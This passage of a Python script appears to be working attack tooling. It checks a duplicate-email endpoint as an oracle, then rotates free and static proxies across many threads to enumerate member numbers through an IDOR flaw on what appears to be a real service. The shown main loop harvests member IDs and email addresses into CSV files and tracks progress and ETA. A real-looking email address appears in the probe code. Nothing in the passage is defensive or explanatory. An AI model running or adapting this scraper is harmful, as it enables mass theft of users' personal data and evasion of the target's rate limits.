            bt = json_from_response(r_true) or {}
            bf = json_from_response(r_false) or {}
            tval = str(bt.get("isDupMbrEmail")).lower() == "true"
            fval = str(bf.get("isDupMbrEmail")).lower() == "true"
            print("dup", "ryujt@naver.com", tval, "nomatch", fval, flush=True)
            if "isDupMbrEmail" not in bt or "isDupMbrEmail" not in bf:
                print("FAIL dup json", bt, bf, flush=True)
                return 1
            if fval:
                print("FAIL collision oracle always true", flush=True)
                return 1
            functional_ok = True
            break
        except Exception as e:
            print("probe_died_after_ok", proxy, type(e).__name__, str(e)[:100], flush=True)
            pool.fail(proxy, auth=is_proxy_auth_fail(e))
            continue

    print(f"probe good={len(pool.good)}", flush=True)
    if not functional_ok:
        print("FAIL no working proxy stayed alive for IDOR+dup", flush=True)
        return 1
    print("SELFTEST_OK good_proxies", len(pool.good), "tail", last_hit, flush=True)
    return 0


def acquire_run_lock(outdir: str):
    import fcntl

    path = os.path.join(outdir, "dump.lock")
    fd = os.open(path, os.O_CREAT | os.O_RDWR, 0o644)
    try:
        fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except BlockingIOError:
        print("another dump is running", path, flush=True)
        raise SystemExit(2)
    os.ftruncate(fd, 0)
    os.write(fd, f"{os.getpid()}\n".encode())
    return fd


def main() -> None:
    socket.setdefaulttimeout(
        max(CONNECT_TIMEOUT + HTTP_TIMEOUT, UNPROVEN_CONNECT + UNPROVEN_READ) + 1.0
    )
    os.makedirs(OUTDIR, exist_ok=True)
    acquire_run_lock(OUTDIR)
    state_path = os.path.join(OUTDIR, "state.json")
    scanned_path = os.path.join(OUTDIR, "scanned.csv")
    email_path = os.path.join(OUTDIR, "emails.csv")
    id_path = os.path.join(OUTDIR, "ids.csv")

    have_id = load_csv_map(id_path)
    have_email = load_csv_map(email_path)
    scanned = load_scanned_status(scanned_path)

    email_new = not os.path.exists(email_path)
    id_new = not os.path.exists(id_path)
    scan_new = not os.path.exists(scanned_path)
    ef = open(email_path, "a", newline="", encoding="utf-8")
    idf = open(id_path, "a", newline="", encoding="utf-8")
    sf = open(scanned_path, "a", newline="", encoding="utf-8")
    ew, iw, sw = csv.writer(ef), csv.writer(idf), csv.writer(sf)
    if email_new:
        ew.writerow(["mbrNo", "mbrId", "email"])
    if id_new:
        iw.writerow(["mbrNo", "mbrId"])
    if scan_new:
        sw.writerow(["mbrNo", "status", "mbrId"])

    pool = init_pool()

    def _panda_topup() -> None:
        last_hb = 0.0
        while True:
            try:
                pool.prune()
                busy = sum(pool.in_flight.values())
                if pool.panda_proven_n() < KEEP_LIVE and pool._alive_urls():
                    # Extract storm while every worker is blocked makes every
                    # KRX request time out. Wait until a slot is free or the pool is empty.
                    if busy < WORKERS or pool.panda_good_n() < 4:
                        pool.fetch()
                pool.reap_now()
                now = time.time()
                if now - last_hb >= 8:
                    print(
                        f"hb panda={pool.panda_good_n()} proven={pool.panda_proven_n()} "
                        f"inflight={sum(pool.in_flight.values())} live={pool.live_n()}",
                        flush=True,
                    )
                    last_hb = now
            except Exception:
                pass
            time.sleep(TOPUP_HUNGRY if pool.panda_proven_n() < KEEP_LIVE else TOPUP_IDLE)

    def _static_topup() -> None:
        first = True
        while True:
            if not first:
                time.sleep(15)
            first = False
            try:
                pool.sync_static()
            except Exception:
                pass

    def _reaper() -> None:
        while True:
            time.sleep(1.0)
            try:
                pool.reap_now()
            except Exception:
                pass

    threading.Thread(target=_panda_topup, name="panda-topup", daemon=True).start()
    threading.Thread(target=_static_topup, name="static-topup", daemon=True).start()
    threading.Thread(target=_reaper, name="hung-reaper", daemon=True).start()
    if pool.urls:
        pool.fetch_all()

    mail_jobs, head, tail, holes = build_jobs(START, END, have_id, have_email, scanned)
    idor_jobs = tail + head + holes
    total = len(mail_jobs) + len(idor_jobs)
    print(
        f"workers={WORKERS} inflight={INFLIGHT} cap={MAX_PER_PROXY} "
        f"slots~{KEEP_LIVE * MAX_PER_PROXY} timeout={CONNECT_TIMEOUT}/{HTTP_TIMEOUT}s "
        f"unproven={UNPROVEN_CONNECT}/{UNPROVEN_READ}s "
        f"panda_probe={int(PANDA_PROBE)} static_strikes={STATIC_STRIKES} "
        f"mail_left={len(mail_jobs)} idor={len(idor_jobs)} "
        f"head={len(head)} tail={len(tail)} holes={len(holes)} "
        f"have_id={len(have_id)} have_email={len(have_email)} "
        f"panda={len(pool.urls)} static={len(pool.static_list)}",
        flush=True,
    )
    last_flush = time.time()
    wrote_id = set(have_id)
    wrote_em = set(have_email)

    def handle(mno: int, mid: str | None, em: str | None, kind: str) -> None:
        nonlocal last_flush
        now = time.time()
        scan_row = id_row = em_row = None
        with _lock:
            _stats["done"] += 1
            _recent.append(now)
            if kind == "idor":
                scan_row = [mno, "id" if mid else "empty", mid or ""]
                if mid and mno not in wrote_id:
                    _stats["ids"] += 1
                    wrote_id.add(mno)
                    id_row = [mno, mid]
            elif kind == "mail" and not em:
                scan_row = [mno, "nomail", mid or ""]
            if em and mno not in wrote_em:
                _stats["emails"] += 1
                wrote_em.add(mno)
                em_row = [mno, mid, em]
            snap = {
                "done": _stats["done"],
                "ids": _stats["ids"],
                "emails": _stats["emails"],
                "err": _stats["err"],
                "retry": _stats["retry"],
            }
            log_now = now - last_flush > 5
        if scan_row:
            sw.writerow(scan_row)
        if id_row:
            iw.writerow(id_row)
        if em_row:
            ew.writerow(em_row)
            ef.flush()
        if log_now:
            idf.flush()
            sf.flush()
            elapsed = max(now - _stats["t0"], 0.001)
            avg = snap["done"] / elapsed
            win = window_rate(now, 30.0)
            remain = max(total - snap["done"], 0)
            use = win if win > 0 else avg
            eta = remain / use if use else 0
            good_n = pool.good_n()
            state = {
                "done": snap["done"],
                "total": total,
                "ids": snap["ids"],
                "emails": snap["emails"],
                "err": snap["err"],
                "retry": snap["retry"],
                "good_proxies": good_n,
                "born": len(pool.born),
                "rate_per_s": round(win or avg, 2),
                "avg_per_s": round(avg, 2),
                "eta_min": round(eta / 60, 1),
                "last": mno,
            }
            with open(state_path, "w", encoding="utf-8") as sfj:
                json.dump(state, sfj)
            print(
                f"done={snap['done']}/{total} ids+={snap['ids']} emails+={snap['emails']} "
                f"retry={snap['retry']} good={good_n} proven={len(pool.proven)} panda={pool.panda_good_n()} "
                f"static={len(pool.static_live())} down={len(pool.static_down)} "
                f"born={len(pool.born)} win={win:.1f}/s avg={avg:.1f}/s "
                f"eta={eta/60:.1f}min last={mno}",
                flush=True,
            )
            last_flush = now

    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        for fut in iter_inflight(ex, idor_jobs, lambda e, n: e.submit(one_idor, n), INFLIGHT):
            mno, mid, em = fut.result()
            handle(mno, mid, em, "idor")
        for fut in iter_inflight(
            ex, mail_jobs, lambda e, item: e.submit(one_mail, item[0], item[1]), INFLIGHT
        ):
            mno, mid, em = fut.result()
            handle(mno, mid, em, "mail")

    ef.close()
    idf.close()
    sf.close()
    print("FINISHED", _stats, flush=True)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest:
        raise SystemExit(selftest())
    main()
